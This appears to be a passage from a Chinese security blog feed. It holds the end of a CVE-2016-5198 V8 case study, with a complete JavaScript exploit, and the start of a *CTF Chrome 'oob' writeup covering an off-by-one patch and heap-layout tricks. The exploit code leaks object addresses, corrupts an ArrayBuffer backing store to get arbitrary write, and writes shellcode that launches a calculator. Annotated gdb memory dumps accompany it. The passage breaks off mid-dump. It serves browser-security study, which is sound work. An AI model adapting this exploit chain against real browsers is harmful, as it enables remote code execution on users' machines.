class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> l;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">l = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check3</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span></span><br><span class="line">l.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">l.xyz1 = addr             </span><br><span class="line">&#125;</span><br><span class="line">Ctor3();</span><br><span class="line">Check3(func_addr_float);</span><br><span class="line">f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br><span class="line">shellcode_addr_float = f64[<span class="number">7</span>];</span><br><span class="line">print(<span class="string">"0x"</span>+(u2d(shellcode_addr_float)).toString(<span class="number">16</span>));</span><br><span class="line"><span class="comment">// gdb-peda$ job 0x108ed87359c1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c1: [JSArrayBuffer]</span></span><br><span class="line"><span class="comment">//  - map = 0x2d714c002db1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0x108ed8705599</span></span><br><span class="line"><span class="comment">//  - elements = 0x37191c982241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - internal fields: 2</span></span><br><span class="line"><span class="comment">//  - backing_store = 0x108ed8735a00-&gt;已经被改成了Function的地址</span></span><br><span class="line"><span class="comment">//  - byte_length = 512</span></span><br><span class="line"><span class="comment">//  - properties = &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  - internal fields = &#123;</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x108ed87359c1-1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c0:0x00002d714c002db10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed87359d0:0x000037191c9822410x0000020000000000</span></span><br><span class="line"><span class="comment">// 0x108ed87359e0:0x0000108ed8735a00-&gt;已经被改成了Function的地址0x0000000000000004</span></span><br><span class="line"><span class="comment">// 0x108ed87359f0:0x00000000000000000x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x0000108ed8735a01-1</span></span><br><span class="line"><span class="comment">// 0x108ed8735a00:0x00002d714c0040f10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed8735a10:0x000037191c9822410x000037191c982351</span></span><br><span class="line"><span class="comment">// 0x108ed8735a20:0x0000108ed872d8490x0000108ed8703951</span></span><br><span class="line"><span class="comment">// 0x108ed8735a30:0x000037191c984b210x000016396d105e00--&gt;shellcode_addr_float[7]</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// gdb-peda$ job 0x0000108ed8735a01</span></span><br><span class="line"><span class="comment">// 0x108ed8735a01: [Function]</span></span><br><span class="line"><span class="comment">//  - map = 0x2d714c0040f1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0x108ed87040b9</span></span><br><span class="line"><span class="comment">//  - elements = 0x37191c982241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - initial_map = </span></span><br><span class="line"><span class="comment">//  - shared_info = 0x108ed872d849 &lt;SharedFunctionInfo&gt;</span></span><br><span class="line"><span class="comment">//  - name = 0x37191c982471 &lt;String[0]: &gt;</span></span><br><span class="line"><span class="comment">//  - formal_parameter_count = 0</span></span><br><span class="line"><span class="comment">//  - context = 0x108ed8703951 &lt;FixedArray[235]&gt;</span></span><br><span class="line"><span class="comment">//  - literals = 0x37191c984b21 &lt;FixedArray[1]&gt;</span></span><br><span class="line"><span class="comment">//  - code = 0x16396d105da1 &lt;Code: FUNCTION&gt;</span></span><br></pre></td></tr></table></figure><p><strong>再将取得的函数真正执行时候执行的函数地址，写入到backingstore，从而通过它进行任意地址写，写入我们的shellcode</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Check3(shellcode_addr_float);</span><br><span class="line"><span class="comment">// pop /usr/bin/xcalc</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(ab);</span><br><span class="line">shellcode[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">shellcode[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">shellcode[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">shellcode[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">shellcode[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">shellcode[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">shellcode[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">shellcode[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">shellcode[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0x3ac0c748</span>;</span><br><span class="line">shellcode[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">shellcode[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">shellcode[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">shellcode[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">shellcode[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">shellcode[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">shellcode[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">shellcode[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">shellcode[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br></pre></td></tr></table></figure><p>然后再执行这个被我们改了内容的函数，就可以弹计算器了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil_f();</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-075203.png" alt=""></p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> n;</span><br><span class="line"><span class="keyword">var</span> m;</span><br><span class="line"><span class="keyword">var</span> l;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// int-&gt;double</span></span><br><span class="line"><span class="comment">// d2u(intaddr/0x100000000,intaddr&amp;0xffffffff)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// double-&gt;int</span></span><br><span class="line"><span class="comment">// u2d(floataddr)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">l = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line"><span class="comment">// oob write empty_Fixed_Array, write object to null_str buffer</span></span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object addr</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print("0x"+u2d(3.4766863919133141e-308;</span></span><br><span class="line"><span class="comment">// print(d2u(0x0019000400007300/0x100000000,0x0019000400007300&amp;0xffffffff));</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check2</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span></span><br><span class="line">m.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">m.xyz1 = <span class="number">0x0</span>                 <span class="comment">// do not modify the value</span></span><br><span class="line">m.xyz2 = <span class="number">0x7000</span>     <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    m.xyz3 = addr </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check3</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span></span><br><span class="line">l.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">l.xyz1 = addr  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// JIT优化</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; ++i) &#123;</span><br><span class="line">    Ctor();</span><br><span class="line">    Ctor2();</span><br><span class="line">    Ctor3();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; ++i) &#123;</span><br><span class="line">    Check(<span class="literal">null</span>);</span><br><span class="line">    Check2(<span class="number">3.4766863919152113e-308</span>);</span><br><span class="line">    Check3(<span class="number">3.4766863919152113e-308</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ctor(); <span class="comment">// 初始化n</span></span><br><span class="line">Ctor2(); <span class="comment">// 初始化m</span></span><br><span class="line">Ctor3(); <span class="comment">// 初始化l</span></span><br><span class="line">print(<span class="string">"jsset is :"</span>);</span><br><span class="line">%DebugPrint(n);</span><br><span class="line"><span class="comment">// %DebugPrint(Check);</span></span><br><span class="line"><span class="comment">// read(1);//插入断点</span></span><br><span class="line">Check(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="literal">null</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line"><span class="keyword">var</span> ab_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+ab_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> ab_len_ptr = ab_addr+<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">ab_len_ptr_float = d2u(ab_len_ptr/<span class="number">0x100000000</span>,ab_len_ptr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line">Check(evil_f);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line"><span class="keyword">var</span> func_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+func_addr.toString(<span class="number">16</span>));</span><br><span class="line">func_addr = func_addr - <span class="number">1</span>;</span><br><span class="line">func_addr_float = d2u(func_addr/<span class="number">0x100000000</span>,func_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">Check(<span class="built_in">String</span>(<span class="literal">null</span>));</span><br><span class="line"><span class="comment">// %DebugPrint(Check2);</span></span><br><span class="line"><span class="comment">// read(1);//插入断点                 </span></span><br><span class="line"></span><br><span class="line">Check2(ab_len_ptr_float);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Check3(func_addr_float);</span><br><span class="line"></span><br><span class="line">f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br><span class="line">shellcode_addr_float = f64[<span class="number">7</span>];</span><br><span class="line">print(<span class="string">"0x"</span>+(u2d(shellcode_addr_float)).toString(<span class="number">16</span>));</span><br><span class="line">Check3(shellcode_addr_float);</span><br><span class="line"><span class="comment">// pop /usr/bin/xcalc</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(ab);</span><br><span class="line">shellcode[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">shellcode[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">shellcode[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">shellcode[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">shellcode[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">shellcode[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">shellcode[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">shellcode[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">shellcode[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0x3ac0c748</span>;</span><br><span class="line">shellcode[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">shellcode[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">shellcode[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">shellcode[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">shellcode[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">shellcode[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">shellcode[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">shellcode[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">shellcode[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br><span class="line"></span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;case-study-cve-2016-5198&quot;&gt;&lt;a href=&quot;#case-study-cve-2016-5198&quot; class=&quot;headerlink&quot; title=&quot;case study:cve-2016-5198&quot;&gt;&lt;/a&gt;case study:cve
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>star ctf chrome oob writeup</title>
    <link href="http://eternalsakura13.com/2019/04/29/*ctf_oob/"/>
    <id>http://eternalsakura13.com/2019/04/29/*ctf_oob/</id>
    <published>2019-04-29T03:51:56.101Z</published>
    <updated>2019-05-01T07:12:37.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="star-ctf-chrome-oob-writeup"><a href="#star-ctf-chrome-oob-writeup" class="headerlink" title="star ctf chrome oob writeup"></a>star ctf chrome oob writeup</h1><h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();<span class="comment">//check len&lt;=2,else return undefine</span></span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements());</span><br><span class="line">+    <span class="keyword">uint32_t</span> length = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());</span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));----&gt;length off by one</span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.<span class="built_in">set</span>(length,value-&gt;Number());----&gt;length off by one</span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure><p>可以看到在length这里有一个off-by-one</p><p>另外，这里有一个非预期的UAF，其实在Object::ToNumber(isolate, args.at<Object>(1)))可以触发回调，通过valueof或者Symbol.toPrimitive可以在这里将array的length改成0之后强制GC将其回收掉，然后重新喷内存占位，由于我们之前缓存了length，可以一开始用一个非常大的length，而此时占位的array是我们可控的，可以占位一个length比较小的array，于是就可以任意OOB，而不是off by one。<br>类似的做法参考CVE-2017-5053，应该也是可以这么利用的，我没做太多尝试，有兴趣的同学可以试一下，不过显然这种做法会非常不稳定。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>v8通过map来判断类型，通过off-by-one来修改map即可产生type confusion</p><h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><h3 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h3><p>通过splice控制array的内存排布紧邻。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> b = [&#123;&#125;, &#123;&#125;, ab, <span class="number">2.2</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="comment">//布局内存，让array连续存放</span></span><br><span class="line">a = a.splice(<span class="number">0</span>);</span><br><span class="line">b = b.splice(<span class="number">0</span>);</span><br><span class="line">c = c.splice(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>test如下：<br>可以看到如图所示的内存布局：<br>a elements的length位置存放的就是a obj的map了，于是a.oob(xxx)就可以将a的map给覆盖掉。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;0x33a1055ce0e1-&gt;0x33a1055ce0b1</span><br><span class="line">&#x2F;&#x2F;0x33a1055ce139-&gt;0x33a1055ce101</span><br><span class="line">&#x2F;&#x2F;0x33a1055ce191-&gt;0x33a1055ce159</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; x&#x2F;60gx 0x33a1055ce0b1-1</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce0b0: &#123;0x000033a10f4814f9 0x0000000400000000-&gt;a elements</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce0c0: 0x3ff199999999999a 0x3ff199999999999a</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce0d0: 0x3ff199999999999a 0x3ff199999999999a&#125;</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce0e0: &#123;0x000033a14e0c2ed9 0x000033a10f480c71-&gt;a obj</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce0f0: 0x000033a1055ce0b1 0x0000000400000000&#125;</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce100: &#123;0x000033a10f480801 0x0000000500000000-&gt;b elements</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce110: 0x000033a1055cdfc9 0x000033a1055ce001</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce120: 0x000033a1055cdf01 0x000033a12d09f3f9</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce130: 0x000033a12d09f409&#125;</span><br><span class="line">&#x2F;&#x2F;                                    &#123;0x000033a14e0c2f79-&gt;b obj</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce140: 0x000033a10f480c71 0x000033a1055ce101</span><br><span class="line">&#x2F;&#x2F; 0x33a1055ce150: 0x0000000500000000&#125;</span><br><span class="line">&#x2F;&#x2F;                                    &#123;0x000033a10f4814f9-&gt;c elements</span><br><span class="line">&#x2F;&#x2F; 